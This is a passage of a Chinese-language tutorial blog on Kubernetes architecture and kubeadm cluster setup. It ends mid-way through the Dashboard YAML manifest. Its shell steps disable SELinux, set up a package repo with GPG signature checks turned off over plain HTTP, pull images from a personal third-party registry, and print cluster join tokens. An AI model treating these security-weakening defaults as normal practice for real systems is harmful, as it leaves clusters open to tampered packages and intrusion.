<p><code>cloud-controller-manager</code> 仅运行特定于云平台的控制回路。 如果你在自己的环境中运行 Kubernetes，或者在本地计算机中运行学习环境， 所部署的环境中不需要云控制器管理器。</p>
<p>与 <code>kube-controller-manager</code> 类似，<code>cloud-controller-manager</code> 将若干逻辑上独立的 控制回路组合到同一个可执行文件中，供你以同一进程的方式运行。 你可以对其执行水平扩容（运行不止一个副本）以提升性能或者增强容错能力。</p>
<p>下面的控制器都包含对云平台驱动的依赖：</p>
<ul>
<li>节点控制器（Node Controller）: 用于在节点终止响应后检查云提供商以确定节点是否已被删除</li>
<li>路由控制器（Route Controller）: 用于在底层云基础架构中设置路由</li>
<li>服务控制器（Service Controller）: 用于创建、更新和删除云提供商负载均衡器</li>
</ul>
<h5 id="②Node-组件"><a href="#②Node-组件" class="headerlink" title="②Node 组件"></a>②Node 组件</h5><p>节点组件在每个节点上运行，维护运行的 Pod 并提供 Kubernetes 运行环境。</p>
<h6 id="kubelet"><a href="#kubelet" class="headerlink" title="kubelet"></a>kubelet</h6><p>一个在集群中每个<a href="https://kubernetes.io/zh/docs/concepts/architecture/nodes/">节点（node）</a>上运行的代理。 它保证<a href="https://kubernetes.io/zh/docs/concepts/overview/what-is-kubernetes/#why-containers">容器（containers）</a>都 运行在 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pod</a> 中。</p>
<p>kubelet 接收一组通过各类机制提供给它的 PodSpecs，确保这些 PodSpecs 中描述的容器处于运行状态且健康。 kubelet 不会管理不是由 Kubernetes 创建的容器。</p>
<h6 id="kube-proxy"><a href="#kube-proxy" class="headerlink" title="kube-proxy"></a>kube-proxy</h6><p><a href="https://kubernetes.io/zh/docs/reference/command-line-tools-reference/kube-proxy/">kube-proxy</a> 是集群中每个节点上运行的网络代理， 实现 Kubernetes <a href="https://kubernetes.io/zh/docs/concepts/services-networking/service/">服务（Service）</a> 概念的一部分。</p>
<p>kube-proxy 维护节点上的网络规则。这些网络规则允许从集群内部或外部的网络会话与 Pod 进行网络通信。</p>
<p>如果操作系统提供了数据包过滤层并可用的话，kube-proxy 会通过它来实现网络规则。否则， kube-proxy 仅转发流量本身。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1626605698082-bf4351dd-6751-44b7-aaf7-7608c847ea42.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_37,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/resize,w_937,limit_0" alt="image.png"></p>
<h3 id="三-kubeadm创建集群"><a href="#三-kubeadm创建集群" class="headerlink" title="三.kubeadm创建集群"></a>三.kubeadm创建集群</h3><p><code>请参照以前Docker安装，先提前为所有机器安装Docker</code></p>
<h4 id="1-安装kubeadm"><a href="#1-安装kubeadm" class="headerlink" title="1.安装kubeadm"></a>1.安装kubeadm</h4><ul>
<li><p>一台兼容的 Linux 主机。Kubernetes 项目为基于 Debian 和 Red Hat 的 Linux 发行版以及一些不提供包管理器的发行版提供通用的指令</p>
</li>
<li><p>每台机器 2 GB 或更多的 RAM （如果少于这个数字将会影响你应用的运行内存)</p>
</li>
<li><p>2 CPU 核或更多</p>
</li>
<li><p>集群中的所有机器的网络彼此均能相互连接(公网和内网都可以)</p>
</li>
<li><ul>
<li><strong>设置防火墙放行规则</strong></li>
</ul>
</li>
<li><p>节点之中不可以有重复的主机名、MAC 地址或 product_uuid。请参见<a href="https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/install-kubeadm/#verify-mac-address">这里</a>了解更多详细信息。</p>
</li>
<li><ul>
<li><strong>设置不同hostname</strong></li>
</ul>
</li>
<li><p>开启机器上的某些端口。请参见<a href="https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/install-kubeadm/#check-required-ports">这里</a> 了解更多详细信息。</p>
</li>
<li><ul>
<li><strong>内网互信</strong></li>
</ul>
</li>
<li><p>禁用交换分区。为了保证 kubelet 正常工作，你 <strong>必须</strong> 禁用交换分区。</p>
</li>
<li><ul>
<li><strong>永久关闭</strong></li>
</ul>
</li>
</ul>
<h5 id="①基础环境"><a href="#①基础环境" class="headerlink" title="①基础环境"></a>①基础环境</h5><p><code>所有机器执行以下操作</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">各个机器设置自己的域名</span></span><br><span class="line">hostnamectl set-hostname xxxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将 SELinux 设置为 permissive 模式（相当于将其禁用）</span></span><br><span class="line">sudo setenforce 0</span><br><span class="line">sudo sed -i &#x27;s/^SELINUX=enforcing$/SELINUX=permissive/&#x27; /etc/selinux/config</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭swap</span></span><br><span class="line">swapoff -a  </span><br><span class="line">sed -ri &#x27;s/.*swap.*/#&amp;/&#x27; /etc/fstab</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">允许 iptables 检查桥接流量</span></span><br><span class="line">cat &lt;&lt;EOF | sudo tee /etc/modules-load.d/k8s.conf</span><br><span class="line">br_netfilter</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;EOF | sudo tee /etc/sysctl.d/k8s.conf</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="line">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="line">EOF</span><br><span class="line">sudo sysctl --system</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="2-安装kubelet-kubeadm-kubectl"><a href="#2-安装kubelet-kubeadm-kubectl" class="headerlink" title="2.安装kubelet,kubeadm,kubectl"></a>2.安装kubelet,kubeadm,kubectl</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF | sudo tee /etc/yum.repos.d/kubernetes.repo</span></span><br><span class="line"><span class="string">[kubernetes]</span></span><br><span class="line"><span class="string">name=Kubernetes</span></span><br><span class="line"><span class="string">baseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64</span></span><br><span class="line"><span class="string">enabled=1</span></span><br><span class="line"><span class="string">gpgcheck=0</span></span><br><span class="line"><span class="string">repo_gpgcheck=0</span></span><br><span class="line"><span class="string">gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg</span></span><br><span class="line"><span class="string">   http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg</span></span><br><span class="line"><span class="string">exclude=kubelet kubeadm kubectl</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> yum install -y kubelet-1.20.9 kubeadm-1.20.9 kubectl-1.20.9 --disableexcludes=kubernetes</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> --now kubelet</span><br></pre></td></tr></table></figure>

<h4 id="2-使用kubeadm引导集群"><a href="#2-使用kubeadm引导集群" class="headerlink" title="2.使用kubeadm引导集群"></a>2.使用kubeadm引导集群</h4><h5 id="①下载各个机器所需要的镜像"><a href="#①下载各个机器所需要的镜像" class="headerlink" title="①下载各个机器所需要的镜像"></a>①下载各个机器所需要的镜像</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> ./images.sh &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">images=(</span><br><span class="line">kube-apiserver:v1.20.9</span><br><span class="line">kube-proxy:v1.20.9</span><br><span class="line">kube-controller-manager:v1.20.9</span><br><span class="line">kube-scheduler:v1.20.9</span><br><span class="line">coredns:1.7.0</span><br><span class="line">etcd:3.4.13-0</span><br><span class="line">pause:3.2</span><br><span class="line">)</span><br><span class="line"><span class="keyword">for</span> imageName <span class="keyword">in</span> <span class="variable">$&#123;images[@]&#125;</span> ; <span class="keyword">do</span></span><br><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images/<span class="variable">$imageName</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">EOF</span><br><span class="line">   </span><br><span class="line"><span class="built_in">chmod</span> +x ./images.sh &amp;&amp; ./images.sh</span><br></pre></td></tr></table></figure>

<h5 id="②初始化主节点"><a href="#②初始化主节点" class="headerlink" title="②初始化主节点"></a>②初始化主节点</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#所有机器添加master域名映射，以下需要修改为自己的</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;172.31.0.4  cluster-endpoint&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#主节点初始化</span></span><br><span class="line">kubeadm init \</span><br><span class="line">--apiserver-advertise-address=172.31.0.4 \</span><br><span class="line">--control-plane-endpoint=cluster-endpoint \</span><br><span class="line">--image-repository registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images \</span><br><span class="line">--kubernetes-version v1.20.9 \</span><br><span class="line">--service-cidr=10.96.0.0/16 \</span><br><span class="line">--pod-network-cidr=192.168.0.0/16</span><br><span class="line"></span><br><span class="line"><span class="comment">#所有网络范围不重叠</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Your Kubernetes control-plane has initialized successfully!</span><br><span class="line"></span><br><span class="line">To start using your cluster, you need to run the following as a regular user:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">mkdir</span> -p <span class="variable">$HOME</span>/.kube</span><br><span class="line">  <span class="built_in">sudo</span> <span class="built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="variable">$HOME</span>/.kube/config</span><br><span class="line">  <span class="built_in">sudo</span> <span class="built_in">chown</span> $(<span class="built_in">id</span> -u):$(<span class="built_in">id</span> -g) <span class="variable">$HOME</span>/.kube/config</span><br><span class="line"></span><br><span class="line">Alternatively, <span class="keyword">if</span> you are the root user, you can run:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">export</span> KUBECONFIG=/etc/kubernetes/admin.conf</span><br><span class="line"></span><br><span class="line">You should now deploy a pod network to the cluster.</span><br><span class="line">Run <span class="string">&quot;kubectl apply -f [podnetwork].yaml&quot;</span> with one of the options listed at:</span><br><span class="line">  https://kubernetes.io/docs/concepts/cluster-administration/addons/</span><br><span class="line"></span><br><span class="line">You can now <span class="built_in">join</span> any number of control-plane nodes by copying certificate authorities</span><br><span class="line">and service account keys on each node and <span class="keyword">then</span> running the following as root:</span><br><span class="line"></span><br><span class="line">  kubeadm <span class="built_in">join</span> cluster-endpoint:6443 --token hums8f.vyx71prsg74ofce7 \</span><br><span class="line">    --discovery-token-ca-cert-hash sha256:a394d059dd51d68bb007a532a037d0a477131480ae95f75840c461e85e2c6ae3 \</span><br><span class="line">    --control-plane </span><br><span class="line"></span><br><span class="line">Then you can <span class="built_in">join</span> any number of worker nodes by running the following on each as root:</span><br><span class="line"></span><br><span class="line">kubeadm <span class="built_in">join</span> cluster-endpoint:6443 --token hums8f.vyx71prsg74ofce7 \</span><br><span class="line">    --discovery-token-ca-cert-hash sha256:a394d059dd51d68bb007a532a037d0a477131480ae95f75840c461e85e2c6ae3</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看集群所有节点</span></span><br><span class="line">kubectl get nodes</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据配置文件，给集群创建资源</span></span><br><span class="line">kubectl apply -f xxxx.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看集群部署了哪些应用？</span></span><br><span class="line">docker ps   ===   kubectl get pods -A</span><br><span class="line"><span class="comment"># 运行中的应用在docker里面叫容器，在k8s里面叫Pod</span></span><br><span class="line">kubectl get pods -A</span><br></pre></td></tr></table></figure>

<h5 id="③根据提示继续"><a href="#③根据提示继续" class="headerlink" title="③根据提示继续"></a>③根据提示继续</h5><p><code>master成功后提示如下</code></p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20221113175423222.png" alt="image-20221113175423222"></p>
<h6 id="Ⅰ设置-kube-config"><a href="#Ⅰ设置-kube-config" class="headerlink" title="Ⅰ设置.kube&#x2F;config"></a>Ⅰ设置.kube&#x2F;config</h6><p>复制上边命令</p>
<p>Ⅱ安装网络组件</p>
<p><a href="https://docs.projectcalico.org/getting-started/kubernetes/self-managed-onprem/onpremises#install-calico-with-kubernetes-api-datastore-more-than-50-nodes">calico官网</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl https://docs.projectcalico.org/manifests/calico.yaml -O</span><br><span class="line"></span><br><span class="line">kubectl apply -f calico.yaml</span><br></pre></td></tr></table></figure>

<h5 id="④加入node节点"><a href="#④加入node节点" class="headerlink" title="④加入node节点"></a>④加入node节点</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm join cluster-endpoint:6443 --token x5g4uy.wpjjdbgra92s25pp \</span><br><span class="line">	--discovery-token-ca-cert-hash sha256:6255797916eaee52bf9dda9429db616fcd828436708345a308f4b917d3457a22</span><br></pre></td></tr></table></figure>

<p><code>新令牌</code></p>
<p><code>kubeadm token create --print-join-command</code></p>
<p><code>高可用部署方式，也是在这一步的时候，使用添加主节点的命令即可</code></p>
<h5 id="⑤验证集群"><a href="#⑤验证集群" class="headerlink" title="⑤验证集群"></a>⑤验证集群</h5><ul>
<li><p>验证集群节点状态</p>
</li>
<li><ul>
<li>kubectl get nodes</li>
</ul>
</li>
</ul>
<h5 id="⑥部署dashboard"><a href="#⑥部署dashboard" class="headerlink" title="⑥部署dashboard"></a>⑥部署dashboard</h5><h6 id="Ⅰ部署"><a href="#Ⅰ部署" class="headerlink" title="Ⅰ部署"></a>Ⅰ部署</h6><p><code>kubernetes官方提供的可视化界面</code></p>
<p><code>https://github.com/kubernetes/dashboard</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.3.1/aio/deploy/recommended.yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Copyright 2017 The Kubernetes Authors.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment"># you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment"># You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment"># See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment"># limitations under the License.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Namespace</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="number">8443</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard-certs</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">Opaque</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard-csrf</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">Opaque</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">csrf:</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard-key-holder</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">Opaque</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ConfigMap</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard-settings</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="comment"># Allow Dashboard to get, update and delete Dashboard exclusive secrets.</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;secrets&quot;</span>]</span><br><span class="line">    <span class="attr">resourceNames:</span> [<span class="string">&quot;kubernetes-dashboard-key-holder&quot;</span>, <span class="string">&quot;kubernetes-dashboard-certs&quot;</span>, <span class="string">&quot;kubernetes-dashboard-csrf&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;delete&quot;</span>]</span><br><span class="line">    <span class="comment"># Allow Dashboard to get and update &#x27;kubernetes-dashboard-settings&#x27; config map.</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;configmaps&quot;</span>]</span><br><span class="line">    <span class="attr">resourceNames:</span> [<span class="string">&quot;kubernetes-dashboard-settings&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;update&quot;</span>]</span><br><span class="line">    <span class="comment"># Allow Dashboard to get metrics.</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;services&quot;</span>]</span><br><span class="line">    <span class="attr">resourceNames:</span> [<span class="string">&quot;heapster&quot;</span>, <span class="string">&quot;dashboard-metrics-scraper&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;proxy&quot;</span>]</span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;services/proxy&quot;</span>]</span><br><span class="line">    <span class="attr">resourceNames:</span> [<span class="string">&quot;heapster&quot;</span>, <span class="string">&quot;http:heapster:&quot;</span>, <span class="string">&quot;https:heapster:&quot;</span>, <span class="string">&quot;dashboard-metrics-scraper&quot;</span>, <span class="string">&quot;http:dashboard-metrics-scraper&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="comment"># Allow Metrics Scraper to get metrics from the Metrics server</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;metrics.k8s.io&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;pods&quot;</span>, <span class="string">&quot;nodes&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">revisionHistoryLimit:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">kubernetesui/dashboard:v2.3.1</span></span><br><span class="line">          <span class="attr">imagePullPolicy:</span> <span class="string">Always</span></span><br><span class="line">          <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8443</span></span><br><span class="line">              <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">          <span class="attr">args:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--auto-generate-certificates</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--namespace=kubernetes-dashboard</span></span><br><span class="line">            <span class="comment"># Uncomment the following line to manually specify Kubernetes API server Host</span></span><br><span class="line">            <span class="comment"># If not specified, Dashboard will attempt to auto discover the API server and connect</span></span><br><span class="line">            <span class="comment"># to it. Uncomment only if the default does not work.</span></span><br><span class="line">            <span class="comment"># - --apiserver-host=http://my-address:port</span></span><br><span class="line">          <span class="attr">volumeMounts:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">kubernetes-dashboard-certs</span></span><br><span class="line">              <span class="attr">mountPath:</span> <span class="string">/certs</span></span><br><span class="line">              <span class="comment"># Create on-disk volume to store exec logs</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/tmp</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">tmp-volume</span></span><br><span class="line">          <span class="attr">livenessProbe:</span></span><br><span class="line">            <span class="attr">httpGet:</span></span><br><span class="line">              <span class="attr">scheme:</span> <span class="string">HTTPS</span></span><br><span class="line">              <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">              <span class="attr">port:</span> <span class="number">8443</span></span><br><span class="line">            <span class="attr">initialDelaySeconds:</span> <span class="number">30</span></span><br><span class="line">            <span class="attr">timeoutSeconds:</span> <span class="number">30</span></span><br><span class="line">          <span class="attr">securityContext:</span></span><br><span class="line">            <span 